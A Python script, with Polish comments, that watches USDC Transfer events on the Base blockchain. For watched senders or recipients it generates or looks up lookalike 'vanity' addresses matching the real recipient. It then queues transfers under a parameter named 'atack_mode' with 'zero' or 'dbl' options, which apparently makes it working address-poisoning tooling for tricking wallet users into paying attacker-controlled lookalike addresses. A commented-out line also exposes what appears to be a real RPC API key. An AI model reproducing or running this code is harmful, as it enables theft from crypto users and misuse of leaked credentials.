import asyncio
import json
from web3 import Web3
from websockets import connect
from tenacity import retry, wait_exponential, stop_after_attempt
import logging
from functools import lru_cache
from collections import deque
import eel
import sys
from backend.stats.database import *
import api_keys as key
from backend.monitor.send_tokens_two_in_ine import call_transfer
from backend.monitor.file_operations_for_monitor import load_addresses_from_file, load_from_to_vanity_map
from backend.monitor.build_data import build_address_map
from backend.adres_gen.temp_vanity import find_vanity_address
from backend.stats.monitor_loging import log_message
from backend.stats.database_stats import insert_log
import api_keys

# Konfiguracja logowania
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

sys.stdout.reconfigure(encoding='utf-8')

NODE_URL_WSS = "wss://base-mainnet.infura.io/ws/v3/" + api_keys.INFURA
#NODE_URL_WSS = "wss://base-mainnet.g.alchemy.com/v2/"  # inny rpc dla testów
#NODE_URL_WSS="wss://base-mainnet.g.alchemy.com/v2/" #inny rpc dla testów
web3_ws = Web3(Web3.LegacyWebSocketProvider(NODE_URL_WSS))



# HTTP dla RPC
NODE_URL_HTTP = "https://base-mainnet.infura.io/v3/"+api_keys.INFURA
web3_http = Web3(Web3.HTTPProvider(NODE_URL_HTTP))




#NODE_URL = 'wss://base-mainnet.g.alchemy.com/v2/Z1Q7N8ZHQ7NYa3fj28b-p5KHiepAac8j'
TRANSFER_TOPIC = "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef"
WATCH_ADDRESS = Web3.to_checksum_address("0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913")
DECIMALS = 6
MAX_BUFFER_SIZE = 100
EVENT_QUEUE_SIZE = 200

# Kolejki
transfer_queue = asyncio.Queue()
recent_tx_hashes = deque(maxlen=MAX_BUFFER_SIZE)
event_queue = asyncio.Queue(maxsize=EVENT_QUEUE_SIZE)

# Semafor dla żądań RPC
RPC_SEMAPHORE = asyncio.Semaphore(5)

# Cache dla kodu kontraktu
@lru_cache(maxsize=1000)
def get_contract_code_cached(address):
    try:
        return web3_http.eth.get_code(address)
    except Exception as e:
        logger.error(f"Błąd pobierania kodu kontraktu dla {address}: {e}")
        return None

# Asynchroniczne pobieranie receiptu
@retry(wait=wait_exponential(multiplier=1, min=2, max=10), stop=stop_after_attempt(2))
async def get_transaction_receipt_async(tx_hash):
    async with RPC_SEMAPHORE:
        try:
            receipt = await asyncio.get_event_loop().run_in_executor(
                None, web3_http.eth.get_transaction_receipt, tx_hash
            )
            if receipt:
                return receipt
            logger.warning(f"Receipt dla {tx_hash} niedostępny.")
            return None
        except Exception as e:
            message = f"⏳ Transakcja {tx_hash} wciąż w mempoolu: {e}"
            logger.warning(message)
            log_message(message)
            return None

async def process_event(event, mode, watched_to_addresses, watched_from_addresses, address_map, database):
    """Przetwarzanie pojedynczego eventu"""
    try:
        if "params" not in event:
            logger.debug(f"Nieoczekiwany event: {event}")
            return

        log = event["params"]["result"]
        tx_hash = log["transactionHash"]

        if tx_hash in recent_tx_hashes:
            message = f"Transakcja {tx_hash} niedawno widziana, pomijam."
            logger.info(message)
            log_message(message)
            return

        from_address = "0x" + log["topics"][1][-40:]
        to_address = "0x" + log["topics"][2][-40:]
        value_hex = log["data"]
        value = Web3.to_int(hexstr=value_hex)
        value_adjusted = value / (10 ** DECIMALS)
        to_address_checksum = Web3.to_checksum_address(to_address)

        receipt = await get_transaction_receipt_async(tx_hash)
        if receipt is None:
            logger.warning(f"⚠️ Receipt dla {tx_hash} niedostępny, pomijam.")
            return

        recent_tx_hashes.append(tx_hash)

        if len(receipt["logs"]) != 1:
            logger.info(f"Więcej niż 1 log: tx {tx_hash}")
            log_message(message)
            return

        contract_code = get_contract_code_cached(to_address_checksum)
        if contract_code is None:
            logger.error(f"Nie udało się pobrać kodu dla {to_address_checksum}")
            return

        if contract_code == b'':
            message = f"✅ Transfer tokenu: {from_address} → {to_address}, TX: {tx_hash}, kwota: {value_adjusted}"
            insert_log("filtered")
            logger.info(message)
            log_message(message, log_type="matched")

            if mode == "monitor_to":
                is_watched = False
                if database:
                    is_watched = get_destination_id(to_address.lower()) is not None
                else:
                    is_watched = to_address.lower() in watched_to_addresses

                if is_watched:
                    message = f"🎯 Znaleziono transfer do śledzonego adresu: {to_address}"
                    logger.info(message)
                    log_message(message, log_type="matched")
                    vanity_address = watched_to_addresses.get(to_address.lower(), to_address)
                    await transfer_queue.put((from_address, vanity_address, value_adjusted))

            elif mode == "monitor_from_vanity":
                is_watched = False
                if database:
                    is_watched = get_source_id(from_address.lower()) is not None
                else:
                    is_watched = from_address.lower() in watched_from_addresses

                if is_watched:
                    message = f"🎯 Znaleziono transfer od śledzonego adresu: {from_address}"
                    logger.info(message)
                    log_message(message, log_type="matched")
                    vanity_to_address = find_vanity_address(to_address, 0, 4)
                    await transfer_queue.put((from_address, vanity_to_address, value_adjusted))

            elif mode == "monitor_from_to":
                if database:
                    good_source = get_source_id(from_address.lower()) is not None
                    good_destination = get_destination_id(to_address.lower()) is not None
                    is_watched = good_source and good_destination
                    if is_watched:
                        dest_id = get_destination_id(to_address.lower())
                        vanity_data = get_vanity_by_dest(dest_id) if dest_id else None
                        vanity_to_address = vanity_data[0] if vanity_data else to_address
                elif from_address in address_map:
                    inner_map = address_map[from_address]
                    vanity_to_address = inner_map.get(to_address, to_address)
                    is_watched = to_address in inner_map

                if is_watched:
                    message = f"🎯 Znaleziono pasujący transfer: {from_address} → {to_address}, vanity: {vanity_to_address}"
                    logger.info(message)
                    log_message(message, log_type="matched")
                    await transfer_queue.put((from_address, vanity_to_address, value_adjusted))

        else:
            logger.info(f"Wysłano do kontraktu: {to_address}")

    except Exception as e:
        logger.error(f"Błąd przetwarzania eventu {tx_hash}: {e}")

@retry(wait=wait_exponential(multiplier=1, min=4, max=10), stop=stop_after_attempt(10))
async def subscribe_logs(mode=None, input_file=None, database=False):
    watched_to_addresses = {}
    watched_from_addresses = set()
    address_map = {}

    try:
        if mode == "monitor_to":
            if input_file:
                watched_to_addresses = build_address_map(input_file)
            else:
                message = "⚠️ Brak pliku CSV dla trybu monitor_to. Kontynuuję bez śledzenia adresów."
                logger.warning(message)
                log_message(message, log_type="error")
        elif mode == "monitor_from_vanity":
            if input_file:
                watched_from_addresses = load_addresses_from_file(input_file)
            else:
                message = "⚠️ Brak pliku TXT dla trybu monitor_from_vanity. Kontynuuję bez śledzenia adresów."
                logger.warning(message)
                log_message(message, log_type="error")
        elif mode == "monitor_from_to" and input_file:
            address_map = load_from_to_vanity_map(input_file)
        else:
            message = f"⚠️ Nieprawidłowy tryb lub brak pliku: {mode}, {input_file}"
            logger.warning(message)
            log_message(message, log_type="error")
    except Exception as e:
        message = f"⚠️ Błąd ładowania danych: {e}"
        logger.error(message)
        log_message(message, log_type="error")

    logger.info("Rozpoczynanie nasłuchiwania logów...")
    while True:
        try:
            async with connect(NODE_URL_WSS, ping_interval=60, ping_timeout=120) as ws:
                subscription_data = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "eth_subscribe",
                    "params": ["logs", {"address": WATCH_ADDRESS, "topics": [TRANSFER_TOPIC]}]
                }
                await ws.send(json.dumps(subscription_data))
                logger.info("Zasubskrybowano eventy Transfer...")

                async def receive_events():
                    while True:
                        try:
                            response = await asyncio.wait_for(ws.recv(), timeout=60)
                            event = json.loads(response)
                            await event_queue.put(event)
                        except asyncio.TimeoutError:
                            logger.warning("⏱ Timeout przy odbiorze – próbuję dalej...")
                        except Exception as e:
                            logger.error(f"❌ Błąd odbierania eventu: {e}")
                            raise e  # pozwala na reconnect przez wyjątek

                async def process_events():
                    while True:
                        event = await event_queue.get()
                        asyncio.create_task(
                            process_event(event, mode, watched_to_addresses, watched_from_addresses, address_map, database)
                        )
                        event_queue.task_done()

                await asyncio.gather(receive_events(), process_events())

        except Exception as e:
            logger.warning(f"🔁 Błąd w subskrypcji: {e}, ponawiam za 5 sekund...")
            await asyncio.sleep(5)

    
    # await asyncio.gather(receive_events(), process_events())


async def process_transfers(mode):
    logger.info("Rozpoczynanie przetwarzania transferów...")
    while True:
        try:
            from_address, to_address, value_adjusted = await transfer_queue.get()
            logger.info(f"Przetwarzanie transferu: {from_address} → {to_address}, kwota: {value_adjusted}")
            if mode =="zero":
               await call_transfer(from_address,to_address,value_adjusted)
            else:
                await call_transfer(from_address,to_address,value_adjusted,"dbl")
            transfer_queue.task_done()
        except Exception as e:
            logger.error(f"Błąd przetwarzania transferu: {e}")
            await asyncio.sleep(1)

@eel.expose
async def start_monitoring(atack_mode,work_mode, input_file):
    await asyncio.gather(
        subscribe_logs(work_mode, input_file),
        process_transfers(atack_mode)
    )

@eel.expose
def start_monitor(atack_mode,work_mode, input_file):
    asyncio.run(start_monitoring(atack_mode,work_mode, input_file))